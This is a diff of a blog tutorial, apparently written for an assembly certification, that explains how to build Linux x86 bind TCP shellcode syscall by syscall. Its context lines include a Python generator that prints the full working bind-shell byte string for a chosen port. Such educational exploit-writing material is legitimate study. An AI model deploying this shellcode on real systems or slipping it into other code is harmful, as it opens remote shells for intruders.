@@ -1,6 +1,6 @@
 Introduction
 ------------
-Bind TCP shell require three syscalls, one for setting up socket that includes [socket()](http://man7.org/linux/man-pages/man2/socket.2.html), [bind()](http://man7.org/linux/man-pages/man2/bind.2.html), [listen()](http://man7.org/linux/man-pages/man2/listen.2.html), and [accept()](http://man7.org/linux/man-pages/man2/accept.2.html) functions. The second syscall is [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html) for file descriptors, and the last syscall [execve()](http://man7.org/linux/man-pages/man2/execve.2.html) used to spawn shell upon receiving a successful TCP connection. This post is an in depth analysis of those syscalls and/or functions as well as their corresponding assembly code. The post will then conclude by tying all the pieces together to create working shellcode.
+Bind TCP shell consist of three main components, one for setting up socket that includes [socket()](http://man7.org/linux/man-pages/man2/socket.2.html), [bind()](http://man7.org/linux/man-pages/man2/bind.2.html), [listen()](http://man7.org/linux/man-pages/man2/listen.2.html), and [accept()](http://man7.org/linux/man-pages/man2/accept.2.html) functions. The second element is [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html) for file descriptors, and the last part is [execve()](http://man7.org/linux/man-pages/man2/execve.2.html) which is used to spawn shell upon receiving a successful TCP connection. This post is an in depth analysis of those syscalls as well as their corresponding assembly code. The post will then conclude by tying all the pieces together to create working shellcode.
 
 socket()
 --------
@@ -10,13 +10,13 @@ The `socket()` function is responsible for creating a communication medium using
 int socket(int domain, int type, int protocol);
 ```
 
-Domain argument specify the protocol family which will be used for communication, we will be dealing with IPv4 Internet protocols hence will use `AF_INET`. The second argument that we need to provide is type, type is responsible for selecting socket type `SOCK_STREAM` for TCP connections in our case. Protocol argument is used to specify what protocol can work with the socket, we only have single protocol hence will go with `0`. Now that we know what the function does let’s update it with our desired values.
+Domain argument specify the protocol family which will be used for communication, we will be dealing with IPv4 Internet protocols hence will use `AF_INET`. The second argument that we need to provide is type, type is responsible for selecting socket type which is `SOCK_STREAM` for TCP connections in our case. Protocol argument is used to specify what protocol can work with the socket, we only have single protocol so will go with `0`. Now that we know what the function does let’s update it with our desired values.
 
 ```C
 int socket(int 2, int 1, int 0);
 ```
 
-Let’s check socket syscall ID on Linux x86 system `EAX`.
+Let’s check socket syscall id on Linux x86 system `EAX`.
 
 ```sh
 root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
@@ -24,7 +24,7 @@ root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcal
 root@falafel:~# 
 ```
 
-Now we need to find ID for `SOCK_STREAM`.
+Now we need to find the id for `SOCK_STREAM`.
 
 ```sh
 root@falafel:~# cat /usr/include/i386-linux-gnu/bits/socket_type.h | grep SOCK_STREAM
@@ -44,7 +44,7 @@ root@falafel:~# cat /usr/include/i386-linux-gnu/bits/socket.h | grep _INET
 root@falafel:~# 
 ```
 
-Finally, we need to figure out what system socket call function ID is `EBX`.
+Lastly, we need to figure out what system socket call function id is `EBX`.
 
 ```sh
 root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep SOCKET
@@ -101,7 +101,7 @@ The `bind()` function is used to bind an address to a socket, and it consist of 
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
 
-`sockfd` points to the `socket()` to bind an address to, hence we need to save the content of `EAX` after socketcall interrupt in `socket()` to `ESI`. The second argument `addr` is basically where you assign an IP address to the socket, but wait there is more to it than just assigning an IP address, according to [ip(7)](http://man7.org/linux/man-pages/man7/ip.7.html) manpage under address format section addr consist of three parts `sin_family`, `sin_port`, and `sin_addr` as shown below.
+`sockfd` points to the `socket()` to bind an address to, hence we need to save the content of `EAX` after socketcall interrupt in `socket()` to `ESI`. The second argument `addr` is basically where you assign an IP address to the socket, but wait there is more to it than just assigning an IP address, according to [ip(7)](http://man7.org/linux/man-pages/man7/ip.7.html) manpage under address format section `addr` consist of three parts `sin_family`, `sin_port`, and `sin_addr` as shown below.
 
 ```C
 struct sockaddr_in {
@@ -120,13 +120,13 @@ significant octet on the left and the least significant octet on the
 right.
 *
 
-`sin_addr` on the other hand is were we actually put in an IP host address in network byte order, and hence we want to listen on all interfaces will go with `INADDR_ANY` which translates to `0`. The last argument would be `addrlen` which defines the size of addr in bytes. lets update `bind()` function.
+`sin_addr` on the other hand is were we actually put in an IP host address in network byte order, and since we want to listen on all interfaces will go with `INADDR_ANY` which translates to `0`. The last argument would be `addrlen` which defines the size of `addr` in bytes. lets update `bind()` function.
 
 ```C
 int bind(int ESI, const struct sockaddr *<sin_family=2, sin_port=2018, sin_addr=0>, socklen_t 16);
 ```
 
-Its time to find ID for `bind()` function `EBX`.
+Its time to find id for `bind()` function `EBX`.
 
 ```sh
 root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep BIND
@@ -189,7 +189,7 @@ At this point I think we all know what `socketfd` does, hence will use `EDX` to 
 int listen(int EDX, int 1);
 ```
 
-Let’s check `listen()` function ID `EBX`.
+Next, we check `listen()` function id `EBX`.
 
 ```sh
 root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep LISTEN
@@ -229,7 +229,7 @@ Now in `accept()` case `addr` and `adrrlen` is referring to the peer socket whic
 int accept(int EDX, struct sockaddr NULL, socklen_t NULL;
 ```
 
-Its time to check `accept()` function ID `EBX`.
+Its time to check `accept()` function id `EBX`.
 
 ```sh
 root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep ACCEPT
@@ -280,7 +280,7 @@ int dup2(int oldfd, int newfd);
 int dup2(int EBX, int <0, 1, 2>);
 ```
 
-Let’s get `dup2()` syscall ID `EAX`.
+Let’s get `dup2()` syscall id `EAX`.
 
 ```sh
 root@falafel:~/Desktop# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
@@ -323,13 +323,13 @@ execve()
 int execve(const char *filename, char *const argv[], char *const envp[]);
 ```
 
-filename is the pointer to the binary to be executed `/bin//sh` in our case, now the reason we went with `/bin//sh` instead of usual `/bin/sh` is the fact we need to push 8 bytes without effecting the executable, which we did! The second argument `argv[]` is an array of arguments to be passed on to the binary as strings, the first argument must contain the address of executable in question `argv[0]`. The last argument `envp[]` is an array of strings to be passed on to executable environment, we’re not going to use any hence will go with `0`. Let’s update `execve()`.
+filename is the pointer to the binary to be executed `/bin//sh` in our case, now the reason we went with `/bin//sh` instead of usual `/bin/sh` is the fact we need to push 8 bytes without effecting the executable. The second argument `argv[]` is an array of arguments to be passed on to the binary as strings, the first argument must contain the address of executable in question `argv[0]`. The last argument `envp[]` is an array of strings to be passed on to executable environment, we’re not going to use any and will go with `0`. Let’s update `execve()`.
 
 ```C
 int execve(const char </bin/sh, NULL>, char *const <address of /bin/sh, NULL>, char *const <NULL>);
 ```
 
-Let’s check `execve()` syscall ID.
+Let’s check `execve()` syscall id.
 
 ```sh
 root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
@@ -365,7 +365,7 @@ Some more code!
 
 Final Shellcode
 ---------------
-In this section we will glue all of previous code blocks together as shown below and then produce our final working shellcode. Feel free to skip the following code and go right to the graphical representation!
+In this section we will glue all of previous code blocks together as shown below and then produce our final working shellcode.
 
 ```nasm
 global _start
@@ -584,7 +584,7 @@ port_shellcode = "\\x" + str(port_shellcode[0:2]) + "\\x" + str(port_shellcode[2
 print P+ "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x5f\\x52\\x66\\x68" + Y+ port_shellcode + P+ "\\x66\\x53\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x5a\\xb0\\x66\\x80\\xc3\\x02\\xcd\\x80\\x50\\x50\\xb0\\x66\\x43\\x52\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80" +W
 ```
 
-Now running the script with port 2018 will output the exact same shellcode generated earlier!
+Now running the script with port `2018` will output the exact same shellcode generated earlier!
 
 ```sh
 ihack4falafel@falafel:~/Desktop# python BindShell.py 2018
@@ -595,7 +595,7 @@ ihack4falafel@falafel#
 
 Closing Thoughts
 ----------------
-I most certainly picked up new skills writing this blog post and hope you did too! All of the above code is available on my github as shown in the link below. Feel free to contact me for questions using the comment section below or just tweet me [@ihack4falafel](https://twitter.com/ihack4falafel) . This post is one of many to come so stay tuned!
+I most certainly picked up new skills writing this blog post and hope you did too! All of the above code is available on my github as shown in the link below. Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel) . This post is one of many to come so stay tuned!
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
